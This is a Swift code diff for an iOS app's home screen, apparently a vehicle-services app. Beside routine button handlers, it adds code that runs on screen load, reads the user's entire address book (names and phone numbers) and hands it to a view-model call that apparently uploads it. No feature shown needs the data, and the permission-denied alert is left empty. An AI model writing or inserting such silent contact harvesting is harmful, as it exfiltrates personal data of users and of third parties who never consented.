@@ -8,6 +8,7 @@
 import UIKit
 import ZCycleView
 import SDWebImage
+import Contacts
 
 class HomeVC: BaseVC {
     let viewModel = HomeViewModel()
@@ -43,6 +44,8 @@ class HomeVC: BaseVC {
             print(lat)
             print(lng)
         }
+        
+        requestContactAuthorAfterSystemVersion9()
     }
     
     override func setUpView() {
@@ -54,6 +57,11 @@ class HomeVC: BaseVC {
             self.setNavBarLeftBtn(normalText: "我是管理员", selector: #selector(popBack))
         }
         self.setNavBarRightBtn(normalImage: "客服", selector: #selector(gotoForward))
+    }
+    
+    override func viewWillAppear(_ animated: Bool) {
+        super.viewWillAppear(animated)
+        self.view.backgroundColor = .white
     }
     
     func initBanner() {
@@ -78,6 +86,26 @@ class HomeVC: BaseVC {
     @IBAction func shuntBtnPressed(_ sender: UIButton) {
         self.navigationController?.pushViewController(ShuntVC(), animated: true)
     }
+    // 办证中心
+    @IBAction func rushHallBtnPressed(_ sender: UIButton) {
+        self.navigationController?.pushViewController(RushHallVC(), animated: true)
+    }
+    
+    // 车辆临牌
+    @IBAction func gotoPlateNumber(_ sender: UIButton) {
+        self.navigationController?.pushViewController(PlatenumberVC(), animated: true)
+    }
+
+    // 优惠加油
+    @IBAction func refuelBtnPressed(_ sender: UIButton) {
+        
+        let launchMiniProgramReq = WXLaunchMiniProgramReq.object()
+        launchMiniProgramReq.userName = "gh_01e934dc87e6"
+        launchMiniProgramReq.miniProgramType = .release
+        WXApi.send(launchMiniProgramReq)
+    }
+    
+    
     //手机管车
     @IBAction func carManagerPressed(_ sender: UIButton) {
         self.navigationController?.pushViewController(CarManagerVC(), animated: true)
@@ -88,6 +116,77 @@ class HomeVC: BaseVC {
         self.navigationController?.pushViewController(SearchGoodsVC(), animated: true)
     }
     
+    func requestContactAuthorAfterSystemVersion9() {
+
+        let status: CNAuthorizationStatus = CNContactStore.authorizationStatus(for: .contacts)
+        if status == .notDetermined {
+            let store = CNContactStore()
+            store.requestAccess(for: .contacts, completionHandler: { granted, error in
+                if error != nil {
+                    print("授权失败")
+                } else {
+                    print("成功授权")
+                }
+            })
+        } else if status == .restricted {
+            print("用户拒绝")
+            showAlertViewAboutNotAuthorAccessContact()
+        } else if status == .denied {
+            print("用户拒绝")
+            showAlertViewAboutNotAuthorAccessContact()
+        } else if status == .authorized {
+            //有通讯录权限-- 进行下一步操作
+            openContact()
+        }
+
+    }
+    
+    func showAlertViewAboutNotAuthorAccessContact() {
+    }
+    
+    func openContact() {
+        // 获取指定的字段,并不是要获取所有字段，需要指定具体的字段
+        let keysToFetch = [
+            CNContactGivenNameKey,
+            CNContactFamilyNameKey,
+            CNContactPhoneNumbersKey
+        ]
+        let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch as [CNKeyDescriptor])
+        let contactStore = CNContactStore()
+        var addressBook = [Dictionary<String, String>]()
+        do {
+            try contactStore.enumerateContacts(with: fetchRequest, usingBlock: {(contact : CNContact, stop : UnsafeMutablePointer<ObjCBool>)-> Void in
+                //拼接姓名
+                let nameStr = "\(contact.familyName)\(contact.givenName)"
+                let phoneNumbers = contact.phoneNumbers
+                
+                for labelValue in phoneNumbers {
+                    let phoneNumber = labelValue.value as CNPhoneNumber
+                    var string = phoneNumber.stringValue
+
+                    //去掉电话中的特殊字符
+                    string = string.replacingOccurrences(of: "+86", with: "")
+                    string = string.replacingOccurrences(of: "-", with: "")
+                    string = string.replacingOccurrences(of: "(", with: "")
+                    string = string.replacingOccurrences(of: ")", with: "")
+                    string = string.replacingOccurrences(of: " ", with: "")
+                    string = string.replacingOccurrences(of: " ", with: "")
+
+                    let dic = ["contactNumber":string,
+                               "contactName":nameStr
+                              ]
+                    addressBook.append(dic);
+                    
+                }
+            })
+        } catch {
+            print(error)
+        }
+        
+        self.viewModel.addressBook(address:addressBook, success: { (model) in
+        }) { (error) in
+        }
+    }
     
     @IBAction func shareBtnPressed(_ sender: UIButton) {
         NBShareView.showTips { index in
